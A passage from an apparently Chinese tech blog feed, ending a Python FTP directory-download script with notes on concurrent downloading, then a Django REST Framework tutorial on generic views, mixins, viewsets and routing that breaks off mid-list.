errHandleFunc(err, rpath, lpath)</span><br><span class="line">                    <span class="keyword">elif</span> verbose:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">'An Error occurred when downloading '</span>\</span><br><span class="line">                              <span class="string">'remote file %s'</span> % rpath</span><br><span class="line">                        traceback.print_exc()</span><br><span class="line">                        <span class="keyword">print</span></span><br><span class="line">                <span class="keyword">if</span> verbose:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">'Host %s: %d/%d/%d(ok/err/total) files downloaded'</span> % (</span><br><span class="line">                        self.conn.host,</span><br><span class="line">                        numDownOk,</span><br><span class="line">                        numDownErr,</span><br><span class="line">                        numFile</span><br><span class="line">                    )</span><br><span class="line">            <span class="keyword">elif</span> pathType == self.PATH_TYPE_UNKNOWN:</span><br><span class="line">                <span class="keyword">if</span> verbose:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">'Unknown type romote path got: %s'</span> % rpath</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Host %s directory %s download finished:'</span> % (</span><br><span class="line">                self.conn.host, rdir</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'%d directories, %d(%d failed) files, %d unknown type.'</span> % (</span><br><span class="line">                numDir,</span><br><span class="line">                numFile,</span><br><span class="line">                numDownErr,</span><br><span class="line">                numUnknown</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">return</span> numDir, numFile, numUnknown, numDownErr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    <span class="keyword">import</span> traceback</span><br><span class="line">    <span class="keyword">from</span> pprint <span class="keyword">import</span> pprint <span class="keyword">as</span> pr</span><br><span class="line"></span><br><span class="line">    flog = open(<span class="string">'err.log'</span>, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(host)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            fd = FtpDownloader(</span><br><span class="line">                host=host,</span><br><span class="line">                user=<span class="string">'test'</span>,</span><br><span class="line">                passwd=<span class="string">'test'</span>,</span><br><span class="line">                port=<span class="number">21</span>,</span><br><span class="line">                timeout=<span class="number">10</span></span><br><span class="line">            )</span><br><span class="line">            numDir, numFile, numUnknown, numDownErr = fd.downloadDir(</span><br><span class="line">                rdir=<span class="string">'.'</span>,</span><br><span class="line">                ldir=<span class="string">'download'</span>,</span><br><span class="line">                tree=<span class="literal">None</span>,</span><br><span class="line">                errHandleFunc=<span class="literal">None</span>,</span><br><span class="line">                verbose=<span class="literal">True</span></span><br><span class="line">            )</span><br><span class="line">            flog.write(</span><br><span class="line">                <span class="string">'%s\nok\n'</span></span><br><span class="line">                <span class="string">'%d directories, %d(%d failed) files, %d unknown type\n\n\n'</span> % (</span><br><span class="line">                    host,</span><br><span class="line">                    numDir,</span><br><span class="line">                    numFile,</span><br><span class="line">                    numDownErr,</span><br><span class="line">                    numUnknown</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">            traceback.print_exc()</span><br><span class="line">            flog.write(</span><br><span class="line">                <span class="string">'%s\nerror\n%s\n\n\n'</span> % (</span><br><span class="line">                    host,</span><br><span class="line">                    traceback.format_exc()</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">    pr(run(sys.argv[<span class="number">1</span>]))</span><br><span class="line">    flog.close()</span><br></pre></td></tr></table></figure>

<p>也可移步至<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2Z0cGRvd24=">github<i class="fa fa-external-link-alt"></i></span>获取代码，欢迎完善。</p>
<p>这里仅抛砖引玉，实现了下载单个FTP的整个目录的核心功能，可以基于该代码继续实现并发下载多个FTP服务器上的指定文件夹的功能。</p>
<p>值得一提的是，这里针对单个FTP服务器上的多个文件下载还是串行的，如想要实现并发下载单个FTP服务器上的多个文件，则可以先通过tree函数得到FTP服务器的目录树，然后再并发下载相应的文件。但并发下载时若多个下载线程共用一个ftplib.FTP类的实例，并调用该实例的retrbinary函数进行下载，则不同线程之间可能会相互影响，具体可以参考ftplib的源码。</p>
<p>当然，要解决这个问题，可以为每个下载线程创建一个独有的ftplib.FTP类的实例，但这样就加大了FTP服务器处理的并发连接数，最大连接数及下载性能还是会受限于FTP服务器，存在不确定性。</p>
<p>我们将实现的程序与Filezilia进行了对比测试，发现它对多个文件的下载过程也是串行了，而最终下载文件的总数及速度二者相近。</p>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>FTP</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（十）：通用视图、视图工具类、视图集以及路由</title>
    <url>/tech/drf-learning-notes-10-generic-views-mixins-viewsets-and-routers/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (10): Generic Views, MixIns, ViewSets and Routers</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li>源码<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvdmlld3MucHk=">rest_framework.views<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvZ2VuZXJpY3MucHk=">rest_framework.generics<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvdmlld3NldHMucHk=">rest_framework.viewsets<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvcm91dGVycy5weQ==">rest_framework.routers<i class="fa fa-external-link-alt"></i></span></li>
</ul>
</li>
<li>官方文档<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZ2VuZXJpYy12aWV3cy8=">API Guild - Generic views<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvdmlld3NldHMv">API Guild - ViewSets<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcm91dGVycy8=">API Guild - Routers<i class="fa fa-external-link-alt"></i></span></li>
</ul>
</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzEwX2RyZl92aWV3cw==">本文demo代码Github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h1 id="AIPView-API视图类"><a href="#AIPView-API视图类" class="headerlink" title="AIPView - API视图类"></a>AIPView - API视图类</h1><p><code>APIView</code>是Django REST Framework提供的所有视图的基类，继承自Django的<code>View</code>父类。</p>
<h2 id="与Django-View的不同"><a href="#与Django-View的不同" class="headerlink" title="与Django View的不同"></a>与Django <code>View</code>的不同</h2><ol>
<li>传入到视图方法中的是REST framework的<code>Request</code>对象，而不是Django的<code>HttpRequeset</code>对象</li>
<li>视图方法可以返回REST framework的<code>Response</code>对象，视图会为响应数据设置（render）符合前端要求的格式</li>
<li>任何<code>APIException</code>异常都会被捕获到，并且处理成合适的响应信息</li>
<li>在进行<code>dispatch()</code>分发前，会对请求进行身份认证、权限检查、流量控制</li>
</ol>
<h2 id="重要类属性"><a href="#重要类属性" class="headerlink" title="重要类属性"></a>重要类属性</h2><p><code>AIPView</code>有如下可设置的重要类属性：</p>
<ul>
<li><code>authentication_classes</code>：列表或元祖，身份认证类</li>
<li><code>permissoin_classes</code>：列表或元祖，权限检查类</li>
<li><code>throttle_classes</code>：列表或元祖，流量控制类</li>
</ul>
<h2 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h2><p>在<code>APIView</code>中仍有<code>get()</code>，<code>post()</code>等其他请求方式的方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response</span><br><span class="line"></span><br><span class="line"><span class="comment"># path('books/', views.BookListView.as_view()),</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookListView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        books = BookInfo.objects.all()</span><br><span class="line">        serializer = BookInfoSerializer(books, many=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> Response(serializer.data)</span><br></pre></td></tr></table></figure>

<h1 id="GenericAPIView-通用API视图类"><a href="#GenericAPIView-通用API视图类" class="headerlink" title="GenericAPIView - 通用API视图类"></a>GenericAPIView - 通用API视图类</h1><p>通用API视图类<code>GenericAPIView</code>继承自<code>APIView</code>，完全兼容<code>APIView</code>，主要增加了操作序列化器和数据库查询的方法，作用是为下面<code>Mixin</code>扩展类的执行提供基础类支持。通常在使用时，可以配合一个或多个<code>Mixin</code>扩展类。</p>
<h2 id="GenericAPIView比APIView多了什么"><a href="#GenericAPIView比APIView多了什么" class="headerlink" title="GenericAPIView比APIView多了什么"></a><code>GenericAPIView</code>比<code>APIView</code>多了什么</h2><ol>
<li><code>get_queryset()</code>：从类属性<code>queryset中</code>获得<code>model</code>的<code>queryset</code>数据。群操作就走<code>get_queryset()</code>方法(包括群查，群增等)。</li>
<li><code>get_object()</code>：从类属性<code>queryset</code>中获得<code>model</code>的<code>queryset</code>数据，再通过有名分组<code>pk</code>确定唯一操作对象。单操作就走<code>get_object()</code>方法（包括单查，单增等）。</li>
<li><code>get_serializer()</code>：从类属性<code>serializer_class</code>中获得<code>serializer</code>的序列化类。</li>
</ol>
<h2 id="重要类属性-1"><a href="#重要类属性-1" class="headerlink" title="重要类属性"></a>重要类属性</h2><p><code>GenericAPIView</code>有如下可设置的重要类属性：</p>
<ul>
<li>列表视图与详情视图共用<ul>
<li><code>queryset</code>：指明视图需要的数据（<code>model</code>查询数据）</li>
<li><code>permissoin_classes</code>：指明视图使用的序列化器</li>
</ul>
</li>
<li>列表视图使用<ul>
<li><code>pagination_class</code>：指定分页控制类</li>
<li><code>filter_backends</code>：指定过滤控制后端</li>
</ul>
</li>
<li>详情页视图使用<ul>
<li><code>lookup_field</code>：自定义主键，有名分组的查询，默认是<code>pk</code></li>
<li><code>lookup_url_kwarg</code>：查询单一数据时url中的参数关键字名称，默认与<code>look_field</code>相同</li>
</ul>
</li>
</ul>
<h2 id="重要类方法"><a href="#重要类方法" class="headerlink" title="重要类方法"></a>重要类方法</h2><ul>
<li><code>get_queryset()</code>：从类属性<code>queryset</code>中获得<code>model</code>的<code>queryset</code>数据　　</li>
<li><code>get_object()</code>：从类属性<code>queryset</code>中获得<code>model</code>的<code>queryset</code>数据，再通过有名分组<code>pk</code>来确定唯一操作对象</li>
<li><code>get_serializer()</code>：从类属性<code>serializer_class</code>中获得<code>serializer</code>的序列化类，主要用来提供给<code>Mixin</code>扩展类使用</li>
</ul>
<h2 id="get-serializer-源码"><a href="#get-serializer-源码" class="headerlink" title="get_serializer 源码"></a><code>get_serializer</code> 源码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_serializer</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Return the serializer instance that should be used for validating and</span></span><br><span class="line"><span class="string">    deserializing input, and for serializing output.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    serializer_class = self.get_serializer_class()</span><br><span class="line">    kwargs[<span class="string">'context'</span>] = self.get_serializer_context()</span><br><span class="line">    <span class="keyword">return</span> serializer_class(*args, **kwargs)</span><br></pre></td></tr></table></figure>

<h2 id="示例代码-1"><a href="#示例代码-1" class="headerlink" title="示例代码"></a>示例代码</h2><h3 id="视图层-views-py"><a href="#视图层-views-py" class="headerlink" title="视图层 views.py"></a>视图层 <code>views.py</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookGenericAPIView</span><span class="params">(GenericAPIView)</span>:</span></span><br><span class="line">    queryset = models.Book.objects.filter(is_delete=<span class="literal">False</span>)</span><br><span class="line">    serializer_class = serializers.BookModelSerializer</span><br><span class="line">    lookup_field = <span class="string">'pk'</span>  <span class="comment"># 先定义好，单查可以使用，默认是pk  自定义主键的有名分组，如果路由有名分组不是pk,这个属性就要自己设置了</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 群取</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        book_query = self.get_queryset()  <span class="comment"># 获取queryset数据（model查询数据）</span></span><br><span class="line">        book_ser = self.get_serializer(book_query, many=<span class="literal">True</span>)</span><br><span class="line">        book_data = book_ser.data</span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=book_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># # 单取</span></span><br><span class="line">    <span class="comment"># def get(self, request, *args, **kwargs):</span></span><br><span class="line">    <span class="comment">#     book_query = self.get_object()</span></span><br><span class="line">    <span class="comment">#     book_ser = self.get_serializer(book_query)</span></span><br><span class="line">    <span class="comment">#     book_data = book_ser.data</span></span><br><span class="line">    <span class="comment">#     return APIResponse(results=book_data)</span></span><br></pre></td></tr></table></figure>

<h3 id="路由层-urls-py"><a href="#路由层-urls-py" class="headerlink" title="路由层 urls.py"></a>路由层 <code>urls.py</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v2/books/'</span>, views.BookGenericAPIView.as_view()),</span><br><span class="line">    path(<span class="string">'v2/books/&lt;pk&gt;/'</span>, views.BookGenericAPIView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h1 id="xxxModelMixin-视图类的模型工具集"><a href="#xxxModelMixin-视图类的模型工具集" class="headerlink" title="xxxModelMixin - 视图类的模型工具集"></a><code>xxxModelMixin</code> - 视图类的模型工具集</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><ul>
<li>提供了几种后端视图（对数据资源的增删改查）处理流程的实现，如果需要编写的视图属于这五种，则视图可以通过继承相应的扩展类来复用代码，减少自己编写的代码量。</li>
<li><code>mixins</code>有五个工具类文件，一共提供了五个工具类，六个工具方法：单查、群查、单增、单删、单整体改、单局部改</li>
</ul>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ul>
<li>继承工具类可以简化请求函数的实现体，但是必须继承<code>GenericAPIView</code>，需要<code>GenericAPIView</code>类提供序列化器与数据库查询的方法(见上方<code>GenericAPIView</code>基类知识点)</li>
<li>工具类的工具方法返回值都是<code>Response</code>类型对象，如果要格式化数据格式再返回给前台，可以通过<code>response.data</code>拿到工具方法返回的<code>Response</code>类型对象的响应数据</li>
</ul>
<h2 id="五大模型工具类"><a href="#五大模型工具类" class="headerlink" title="五大模型工具类"></a>五大模型工具类</h2><h3 id="ListModelMixin-群查"><a href="#ListModelMixin-群查" class="headerlink" title="ListModelMixin 群查"></a><code>ListModelMixin</code> 群查</h3><ul>
<li>列表视图扩展类，提供<code>list</code>方法快速实现查询视图</li>
<li>返回<code>200</code>状态码</li>
<li>除了查询，该<code>list</code>方法会对数据进行过滤和分页</li>
</ul>
<h3 id="CreateModelMixin-单增"><a href="#CreateModelMixin-单增" class="headerlink" title="CreateModelMixin 单增"></a><code>CreateModelMixin</code> 单增</h3><ul>
<li>创建视图扩展类，提供<code>create</code>方法快速创建资源的视图，成功返回<code>201</code>的状态码</li>
<li><strong>没有群增的方法，需要自己手动写</strong></li>
</ul>
<h3 id="RetrieveModelMixin-单查"><a href="#RetrieveModelMixin-单查" class="headerlink" title="RetrieveModelMixin 单查"></a><code>RetrieveModelMixin</code> 单查</h3><ul>
<li>详情视图扩展类，提供<code>retrieve</code>方法，可以快速实现返回一个存在的数据对象</li>
</ul>
<h3 id="UpdateModelMixin-更新-修改"><a href="#UpdateModelMixin-更新-修改" class="headerlink" title="UpdateModelMixin 更新/修改"></a><code>UpdateModelMixin</code> 更新/修改</h3><ul>
<li>更新视图扩展类，提供<code>update</code>方法，可以快速实现更新一个存在的数据对象，同时也提供<code>partial_update</code>方法，可以实现局部更新</li>
<li><strong>只有单整体改和单局部改，没有群整体改和群局部改</strong></li>
</ul>
<h3 id="DestoryModelMixin-删除"><a href="#DestoryModelMixin-删除" class="headerlink" title="DestoryModelMixin 删除"></a><code>DestoryModelMixin</code> 删除</h3><ul>
<li>删除视图扩展类，提供<code>destory</code>方法，可以快速实现删除一个存在数据对象</li>
<li>一般不怎么用到，因为实际开发中并不会真的删除数据，而是修改是否可用的标记</li>
</ul>
<h2 id="示例代码-2"><a href="#示例代码-2" class="headerlink" title="示例代码"></a>示例代码</h2><h3 id="视图层-views-py-1"><a href="#视图层-views-py-1" class="headerlink" title="视图层 views.py"></a>视图层 <code>views.py</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.mixins <span class="keyword">import</span> ListModelMixin, CreateModelMixin, RetrieveModelMixin, UpdateModelMixin</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookMixinGenericAPIView</span><span class="params">(ListModelMixin, CreateModelMixin, RetrieveModelMixin, UpdateModelMixin, GenericAPIView)</span>:</span></span><br><span class="line">    <span class="comment"># GenericAPIView提供的序列化器和查询的数据</span></span><br><span class="line">    queryset = models.Book.objects.filter(is_delete=<span class="literal">False</span>)</span><br><span class="line">    serializer_class = serializers.BookModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 单查和群查</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'pk'</span> <span class="keyword">in</span> kwargs:</span><br><span class="line">            <span class="comment"># 单查  RetrieveModelMixin方法</span></span><br><span class="line">            response = self.retrieve(request, *args, **kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># mixins提供的list方法的响应对象是Response，将该对象格式化为自定义的APIResponse</span></span><br><span class="line">            response = self.list(request, *args, **kwargs)  <span class="comment"># 群查 ListModelMixin</span></span><br><span class="line">        <span class="comment"># response的数据都存放在response.data中</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=response.data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 单增</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        response = self.create(request, *args, **kwargs)  <span class="comment"># CreateModelMixin方法</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=response.data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 单整体修改</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">put</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        response = self.update(request, *args, **kwargs)  <span class="comment"># UpdateModelMixin</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=response.data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 单局部修改</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">patch</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        response = self.partial_update(request, *args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=response.data)</span><br></pre></td></tr></table></figure>


<h3 id="路由层-urls-py-1"><a href="#路由层-urls-py-1" class="headerlink" title="路由层 urls.py"></a>路由层 <code>urls.py</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v3/books/'</span>, views.BookMixinGenericAPIView.as_view()),</span><br><span class="line">    path(<span class="string">'v3/books/&lt;pk&gt;/'</span>, views.BookMixinGenericAPIView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>


<h1 id="xxxAPIView-功能性子视图类"><a href="#xxxAPIView-功能性子视图类" class="headerlink" title="xxxAPIView - 功能性子视图类"></a>xxxAPIView - 功能性子视图类</h1><p>功能性子视图类继承了<code>GenericAPIView</code>和各种<code>Mixins</code>工具类</p>
<ol>
<li>功能性视图类都是<code>GenericAPIView</code>的子类，且不同的子类继承了不同的工具类</li>
<li>工功能性视图类的功能可以满足需求，只需要继承工具视图，并且提供<code>queryset</code>与<code>serializer_class</code>即可</li>
</ol>
<h2 id="各大功能子视图类"><a href="#各大功能子视图类" class="headerlink" title="各大功能子视图类"></a>各大功能子视图类</h2><p>一表胜千言：</p>
<table>
<thead>
<tr>
<th>视图</th>
<th>作用</th>
<th>请求类型</th>
<th>父类</th>
</tr>
</thead>
<tbody><tr>
<td>ListAPIView</td>
<td>查询多条数据</td>
<td>get</td>
<td>GenericAPIView <br/> ListModelMixin</td>
</tr>
<tr>
<td>CreateAPIView</td>
<td>新增一条数据</td>
<td>post</td>
<td>GenericAPIView <br/> CreateModelMixin</td>
</tr>
<tr>
<td>RetrieveAPIView</td>
<td>查询一条数据</td>
<td>get</td>
<td>GenericAPIView <br/> RetrieveModelMixin</td>
</tr>
<tr>
<td>UpdateAPIView</td>
<td>修改一条数据</td>
<td>put <br/> patch</td>
<td>GenericAPIView  <br/>UpdateModelMixin</td>
</tr>
<tr>
<td>DestroyAPIView</td>
<td>删除一条数据</td>
<td>delete</td>
<td>GenericAPIView <br/> DestroyModelMixin</td>
</tr>
<tr>
<td>RetrieveUpdateAPIView</td>
<td>单查 <br/> 更新一条数据</td>
<td>get<br/>put<br/>patch</td>
<td>GenericAPIView<br/>RetrieveModelMixin<br/>UpdateModelMixin</td>
</tr>
<tr>
<td>RetrieveUpdateDestroyAPIView</td>
<td>单查<br/>更新<br/>删除一条数据</td>
<td>get<br/>put<br/>patch<br/>delete</td>
<td>GenericAPIView<br/> RetrieveModelMixin<br/>UpdateModelMixin<br/>DestroyModelMixin</td>
</tr>
<tr>
<td>ListCreateAPIView</td>
<td>群查<br/>更新一条</td>
<td>get<br/>post</td>
<td>GenericAPIView<br/>ListModelMixin<br/>mixins.CreateModelMixin</td>
</tr>
</tbody></table>
<h2 id="示例代码-3"><a href="#示例代码-3" class="headerlink" title="示例代码"></a>示例代码</h2><h3 id="视图层-views-py-2"><a href="#视图层-views-py-2" class="headerlink" title="视图层 views.py"></a>视图层 <code>views.py</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.generics <span class="keyword">import</span> ListCreateAPIView, UpdateAPIView</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookListCreatePIView</span><span class="params">(ListCreateAPIView, UpdateAPIView)</span>:</span></span><br><span class="line">    queryset = models.Book.objects.filter(is_delete=<span class="literal">False</span>)</span><br><span class="line">    serializer_class = serializers.BookModelSerializer</span><br></pre></td></tr></table></figure>

<h3 id="路由层-urls-py-2"><a href="#路由层-urls-py-2" class="headerlink" title="路由层 urls.py"></a>路由层 <code>urls.py</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v4/books/'</span>, views.BookListCreatePIView.as_view()),</span><br><span class="line">    path(<span class="string">'v4/books/&lt;pk&gt;/'</span>, views.BookListCreatePIView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h1 id="xxxViewset-视图集"><a href="#xxxViewset-视图集" class="headerlink" title="xxxViewset - 视图集"></a>xxxViewset - 视图集</h1><h2 id="常用视图集父类"><a href="#常用视图集父类" class="headerlink" title="常用视图集父类"></a>常用视图集父类</h2><h3 id="ViewSetMixin"><a href="#ViewSetMixin" class="headerlink" title="ViewSetMixin"></a>ViewSetMixin</h3><p><code>ViewSetMixin</code>主要是自定义了<code>as_view</code>方法，使可以通过其参数指定 <code>HTTP_METHOD</code>与函数的映射关系，如 <code>view = MyViewSet.as_view({&#39;get&#39;: &#39;list&#39;, &#39;post&#39;: &#39;create&#39;})</code></p>
<h3 id="ViewSet"><a href="#ViewSet" class="headerlink" title="ViewSet"></a>ViewSet</h3><p>继承自<code>APIView</code>和<code>ViewSetMixin</code>，没有提供任何方法，需要自己写</p>
<h3 id="GenericViewSet"><a href="#GenericViewSet" class="headerlink" title="GenericViewSet"></a>GenericViewSet</h3><p>继承<code>GenericAPIView</code>和<code>ViewSetMixin</code>，其中<code>GenericAPIView</code>提供了基础方法，可以直接搭配<code>Mixin</code>扩展类使用，因此比较常用</p>
<h3 id="ModelViewSet"><a href="#ModelViewSet" class="headerlink" title="ModelViewSet　　"></a>ModelViewSet　　</h3><p>继承<code>GenericViewset</code>，但同时也包括<code>ListModelMixin</code>、<code>CreateModelMixin</code>等<code>mixin</code>扩展类</p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><ol>
<li>视图集都是默认优先继承<code>ViewSetMixin</code>类，再继承一个视图类（<code>GenericAPIView</code>或<code>APIView</code>）</li>
<li><code>ViewSetMixin</code>提供了重写的<code>as_view()</code>方法，继承视图集的视图类，配置路由时调用<code>as_view()</code>必须传入 请求名-函数名 映射关系字典</li>
</ol>
<p>例如: </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path(<span class="string">'v5/books/'</span>, views.BookGenericViewSet.as_view(&#123;<span class="string">'get'</span>: <span class="string">'my_get_list'</span>&#125;)),</span><br></pre></td></tr></table></figure>

<p>表示<code>get</code>请求会交给<code>my_get_list</code>视图函数处理</p>
<h2 id="GenericViewSet-示例代码"><a href="#GenericViewSet-示例代码" class="headerlink" title="GenericViewSet 示例代码"></a>GenericViewSet 示例代码</h2><h3 id="路由层-urls-py-3"><a href="#路由层-urls-py-3" class="headerlink" title="路由层 urls.py"></a>路由层 urls.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">       <span class="comment"># View的as_view()：将get请求映射到视图类的get方法</span></span><br><span class="line">    <span class="comment"># ViewSet的as_view(&#123;'get': 'my_get_list'&#125;)：将get请求映射到视图类的my_get_list方法</span></span><br><span class="line">    path(<span class="string">'v5/books/'</span>,</span><br><span class="line">         views.BookGenericViewSet.as_view(&#123;<span class="string">'get'</span>: <span class="string">'my_get_list'</span>&#125;)),</span><br><span class="line">    path(<span class="string">'v5/books/&lt;pk&gt;/'</span>,</span><br><span class="line">         views.BookGenericViewSet.as_view(&#123;<span class="string">'get'</span>: <span class="string">'my_get_obj'</span>&#125;)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h3 id="视图层-views-py-3"><a href="#视图层-views-py-3" class="headerlink" title="视图层 views.py"></a>视图层 views.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.viewsets <span class="keyword">import</span> GenericViewSet</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> mixins  <span class="comment">#工具集 可以使用list,retrieve等方法</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookGenericViewSet</span><span class="params">(RetrieveModelMixin, ListModelMixin, GenericViewSet)</span>:</span></span><br><span class="line">    queryset = models.Book.objects.filter(is_delete=<span class="literal">False</span>)</span><br><span class="line">    serializer_class = serializers.BookModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">my_get_list</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.list(request, *args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">my_get_obj</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.retrieve(request, *args, **kwargs)</span><br></pre></td></tr></table></figure>

<h2 id="GenericViewSet与ViewSet"><a href="#GenericViewSet与ViewSet" class="headerlink" title="GenericViewSet与ViewSet"></a><code>GenericViewSet</code>与<code>ViewSet</code></h2><h3 id="异同"><a href="#异同" class="headerlink" title="异同"></a>异同</h3><ol>
<li><code>GenericViewSet</code>和<code>ViewSet</code>都继承了<code>ViewSetMixin</code>，<code>as_view</code>都可以配置 请求-函数 映射</li>
<li><code>GenericViewSet</code>继承的是<code>GenericAPIView</code>视图类，用来完成标准的 <code>model</code> 类操作接口</li>
